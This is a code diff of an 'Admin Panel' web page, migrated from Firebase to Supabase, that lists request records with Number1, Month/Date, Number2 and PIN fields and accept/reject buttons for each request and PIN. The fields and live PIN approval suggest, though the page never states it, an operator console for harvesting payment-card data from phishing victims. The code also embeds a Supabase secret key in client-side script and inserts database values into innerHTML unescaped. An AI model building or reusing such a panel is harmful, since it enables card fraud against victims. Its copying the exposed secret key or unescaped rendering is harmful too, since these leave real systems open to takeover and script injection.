@@ -4,37 +4,39 @@
 
 <title>Admin Panel</title>
 
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js"></script>
+
 <style>
 
 body{
-    font-family:Arial;
     background:#111;
     color:white;
+    font-family:Arial;
     padding:30px;
 }
 
 .card{
     background:#1b1b1b;
     padding:20px;
-    border-radius:15px;
     margin-bottom:20px;
+    border-radius:15px;
 }
 
 button{
-    padding:10px 16px;
-    margin-right:10px;
+    padding:10px 15px;
     border:none;
     border-radius:10px;
+    margin-right:10px;
     cursor:pointer;
 }
 
 .accept{
-    background:#00c853;
+    background:green;
     color:white;
 }
 
 .reject{
-    background:#ff1744;
+    background:red;
     color:white;
 }
 
@@ -47,68 +49,57 @@ button{
 
 <div id="data"></div>
 
-<script type="module">
+<script>
 
-import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+const SUPABASE_URL = 'https://ijvtokyhuqrwndyfxzrn.supabase.co/rest/v1/';
+const SUPABASE_KEY = 'sb_secret_wov0l5J9T21BFj1GttjkhQ_rPby5lJQ';
 
-import {
-getFirestore,
-collection,
-onSnapshot,
-doc,
-updateDoc
-}
-from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+const client = supabase.createClient(
+SUPABASE_URL,
+SUPABASE_KEY
+);
 
 
-// For Firebase JS SDK v7.20.0 and later, measurementId is optional
-const firebaseConfig = {
-  apiKey: "AIzaSyC5YbZhR6rgKB3P5b7NFJLc0v9XTfV13fY",
-  authDomain: "live-project-b8670.firebaseapp.com",
-  projectId: "live-project-b8670",
-  storageBucket: "live-project-b8670.firebasestorage.app",
-  messagingSenderId: "697940186812",
-  appId: "1:697940186812:web:839b1bdd9291aea6e862b9",
-  measurementId: "G-L9PNRZEV5W"
-};
+// LOAD DATA
+async function loadData(){
 
-const app = initializeApp(firebaseConfig);
-const db = getFirestore(app);
-
-
-onSnapshot(collection(db,'requests'),(snapshot)=>{
+    const { data } = await client
+    .from('requests')
+    .select('*')
+    .order('id',{ascending:false});
 
     let html = '';
 
-    snapshot.forEach((docSnap)=>{
-
-        const data = docSnap.data();
+    data.forEach(row=>{
 
         html += `
 
         <div class="card">
 
-        <h3>ID: ${docSnap.id}</h3>
+        <h3>ID: ${row.id}</h3>
 
-        <p>Number1: ${data.number1}</p>
-        <p>Month: ${data.dateValue}</p>
-        <p>Number2: ${data.number2}</p>
+        <p>Number1: ${row.number1}</p>
 
-        <p>Status: ${data.status}</p>
+        <p>Date: ${row.date_value}</p>
+
+        <p>Number2: ${row.number2}</p>
+
+        <p>Status: ${row.status}</p>
 
         `;
 
-        if(data.status === 'pending'){
+        // ACCEPT/REJECT
+        if(row.status === 'pending'){
 
             html += `
 
             <button class="accept"
-            onclick="approve('${docSnap.id}')">
+            onclick="acceptReq(${row.id})">
             Accept
             </button>
 
             <button class="reject"
-            onclick="rejectReq('${docSnap.id}')">
+            onclick="rejectReq(${row.id})">
             Reject
             </button>
 
@@ -116,30 +107,33 @@ onSnapshot(collection(db,'requests'),(snapshot)=>{
 
         }
 
-        if(data.pin){
+        // PIN
+        if(row.pin){
 
             html += `
 
             <hr>
 
-            <p>PIN: ${data.pin}</p>
-            <p>PIN Status: ${data.pinStatus}</p>
+            <p>PIN: ${row.pin}</p>
+
+            <p>PIN STATUS: ${row.pin_status}</p>
 
             `;
 
         }
 
-        if(data.pinStatus === 'pending'){
+        // PIN APPROVAL
+        if(row.pin_status === 'pending'){
 
             html += `
 
             <button class="accept"
-            onclick="approvePin('${docSnap.id}')">
+            onclick="acceptPin(${row.id})">
             Accept PIN
             </button>
 
             <button class="reject"
-            onclick="rejectPin('${docSnap.id}')">
+            onclick="rejectPin(${row.id})">
             Reject PIN
             </button>
 
@@ -153,38 +147,61 @@ onSnapshot(collection(db,'requests'),(snapshot)=>{
 
     document.getElementById('data').innerHTML = html;
 
-});
+}
+
+setInterval(loadData,2000);
+
+loadData();
 
 
-window.approve = async(id)=>{
+// ACCEPT
+async function acceptReq(id){
 
-    await updateDoc(doc(db,'requests',id),{
+    await client
+    .from('requests')
+    .update({
         status:'accepted'
-    });
+    })
+    .eq('id',id);
 
 }
 
-window.rejectReq = async(id)=>{
 
-    await updateDoc(doc(db,'requests',id),{
+// REJECT
+async function rejectReq(id){
+
+    await client
+    .from('requests')
+    .update({
         status:'rejected'
-    });
+    })
+    .eq('id',id);
 
 }
 
-window.approvePin = async(id)=>{
 
-    await updateDoc(doc(db,'requests',id),{
-        pinStatus:'accepted'
-    });
+// ACCEPT PIN
+async function acceptPin(id){
+
+    await client
+    .from('requests')
+    .update({
+        pin_status:'accepted'
+    })
+    .eq('id',id);
 
 }
 
-window.rejectPin = async(id)=>{
 
-    await updateDoc(doc(db,'requests',id),{
-        pinStatus:'rejected'
-    });
+// REJECT PIN
+async function rejectPin(id){
+
+    await client
+    .from('requests')
+    .update({
+        pin_status:'rejected'
+    })
+    .eq('id',id);
 
 }
 
